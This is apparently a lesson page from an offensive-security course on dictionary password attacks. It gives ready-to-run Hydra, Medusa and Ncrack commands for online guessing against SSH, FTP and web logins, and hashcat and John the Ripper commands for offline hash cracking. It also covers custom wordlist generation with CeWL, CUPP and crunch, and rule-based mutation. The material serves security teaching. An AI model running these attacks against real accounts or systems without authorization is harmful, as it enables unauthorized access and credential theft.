# Dictionary Attacks

## Unit 4 - Topic 3 | Password Attacks

---

## Overview

**Dictionary attacks** try passwords from a pre-compiled wordlist. Since most users choose common, predictable passwords, dictionary attacks are far more efficient than brute force and succeed in the majority of cases.

---

## 1. Popular Wordlists

| Wordlist | Size | Location |
|----------|:----:|---------|
| **rockyou.txt** | 14M | `/usr/share/wordlists/rockyou.txt` |
| **SecLists passwords** | Various | `/usr/share/seclists/Passwords/` |
| **common-passwords** | 10K | SecLists top 10000 |
| **darkweb2017** | 10M | SecLists DarkWeb lists |
| **crackstation** | 1.5B | Download from crackstation.net |
| **hashesorg** | 7.7B | hashs.org wordlist |

```bash
# === DECOMPRESS ROCKYOU ===
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# === SECLISTS USEFUL LISTS ===
ls /usr/share/seclists/Passwords/
# Common-Credentials/
# Leaked-Databases/
# Default-Credentials/
# darkweb2017-top10000.txt
```

---

## 2. Online Dictionary Attacks

```bash
# === HYDRA ===
# SSH:
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh -t 4

# FTP:
hydra -l admin -P wordlist.txt target.com ftp

# HTTP Basic Auth:
hydra -l admin -P wordlist.txt target.com http-get /admin/

# HTTP POST Form:
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"

# Multiple usernames:
hydra -L users.txt -P wordlist.txt target.com ssh

# === MEDUSA ===
medusa -h target.com -u admin -P wordlist.txt -M ssh
medusa -h target.com -u admin -P wordlist.txt -M ftp

# === NCRACK ===
ncrack -U users.txt -P wordlist.txt target.com:22
```

---

## 3. Offline Dictionary Attacks

```bash
# === HASHCAT ===
# NTLM hashes:
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5 hashes:
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA-256:
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# NTLMv2 (Responder captures):
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt

# === JOHN THE RIPPER ===
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
john --format=NT --wordlist=rockyou.txt ntlm_hashes.txt

# Show cracked passwords:
john --show hashes.txt
hashcat -m 1000 hashes.txt --show
```

---

## 4. Custom Wordlist Generation

```bash
# === CEWL (Crawl Website for Words) ===
cewl https://target.com -d 3 -m 5 -w custom_words.txt
# -d 3: crawl depth 3
# -m 5: minimum word length 5

# === CUPP (Common User Password Profiler) ===
cupp -i
# Interactive — asks about target:
# Name, birthday, pet name, partner, etc.
# Generates personalized wordlist

# === CRUNCH (Pattern-Based Generator) ===
crunch 8 8 -t Target%% -o target_passwords.txt
# Generates: Target00 through Target99

crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o output.txt
# All 6-8 char combinations of lowercase + digits

# === COMBINE AND DEDUPLICATE ===
cat rockyou.txt custom_words.txt company_words.txt | sort -u > combined.txt
```

---

## 5. Rule-Based Attacks

```bash
# === HASHCAT RULES ===
# Rules modify each word in the wordlist:
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# POPULAR RULE FILES:
# best64.rule         — top 64 most effective rules
# rockyou-30000.rule  — 30K rules based on rockyou analysis
# d3ad0ne.rule        — comprehensive rules
# toggles1.rule       — case toggling

# WHAT RULES DO (example word: "password"):
# l          → password (lowercase)
# u          → PASSWORD (uppercase)
# c          → Password (capitalize first)
# $1         → password1 (append 1)
# $!         → password! (append !)
# ^1         → 1password (prepend 1)
# sa@        → p@ssword (substitute a→@)
# se3        → passw0rd (substitute e→3)

# COMBINED EFFECT:
# "password" with rules generates:
# Password, PASSWORD, password1, password!, Password1!,
# p@ssword, P@ssw0rd!, password2024, Password2024!, etc.

# === JOHN RULES ===
john --wordlist=wordlist.txt --rules=best64 hashes.txt
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **rockyou.txt** | Most popular wordlist (14M passwords) |
| **Hydra** | Online dictionary attack tool |
| **Hashcat -a 0** | Offline dictionary (wordlist) mode |
| **CeWL** | Generate wordlist from target website |
| **CUPP** | Personalized password profiler |
| **Rules** | Modify wordlist entries for variations |

---

## Quick Revision Questions

1. **Why are dictionary attacks more efficient than brute force?**
2. **What is rockyou.txt and where does it come from?**
3. **How does CeWL generate custom wordlists?**
4. **What do Hashcat rules do?**
5. **When should you combine dictionary attacks with rules?**

---

[← Previous: Brute Force Attacks](02-brute-force-attacks.md) | [Next: Password Spraying →](04-password-spraying.md)

---

*Unit 4 - Topic 3 of 7 | [Back to README](../README.md)*
